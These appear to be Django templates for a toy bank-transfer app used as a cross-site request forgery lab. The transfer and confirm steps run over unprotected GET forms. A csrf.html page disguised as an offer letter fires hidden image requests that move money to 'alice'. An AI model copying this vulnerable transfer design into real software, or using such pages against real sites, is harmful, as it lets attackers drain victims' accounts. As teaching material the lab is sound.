# confirm.html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Bank Transfer</title>
    </head>
    
    
    <body>
        <h2>Confirm transaction</h1>
    
        <table>
        <tr>
        <th style="text-align:left">From: <td>{{user.username}} 
        <tr>
        <th style="text-align:left">To:  <td>{{request.session.to}}
        <tr>
        <th style="text-align:left">Amount:  <td>{{request.session.amount}}
        </table>
    
        <br/>
        Are you sure?
        <form action='/confirm/' method="GET">
            <input type="submit" value="Yes"/>
        </form>
        <form action='/' method="GET">
            <input type="submit" value="No"/>
        </form>
    </body>
    
    
    </body>
</html>



# index.html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Bank Transfer</title>
    </head>
    
    
    <body>
        <h1>Your account</h1>
    
        <table>
        <tr>
        <th style="text-align:left">Username: <td>{{user.username}} 
        <tr>
        <th style="text-align:left">Balance:  <td>{{user.account.balance}}
        </table>
    
    
        <form action='logout/' method="POST">
            {% csrf_token %}
            <input type="submit" value="Logout"/>
        </form>
        
        <h2>Transfer money</h2>
    
        <form action='transfer/' method="GET">
            <span>To:</span><br/>
            <select name="to">
            {% for account in accounts %}
                <option value="{{account.user.username}}">{{account.user.username}}</option>
            {% endfor %}
            </select><br/>
    
            <span>Amount:</span><br/>
            <input type="number" name="amount"/><br/>
    
            <input type="submit" value="Transfer"/>
        </form>
    </body>
    
    
    </body>
</html>



# login.html
<h2>Login</h2>
<form method="post">
    {% csrf_token %}
    {{ form.as_p }}
    <button type="submit">Login</button>
</form>



# csrf.html
<html>
    
<body>
Dear Sir.<br/>
    
I would like you to present you with this great opportunity.
    
<img src="http://localhost:8000/transfer/?to=alice&amount=10">
<img src="http://localhost:8000/confirm/?">
    
</body>
    
</html>
	 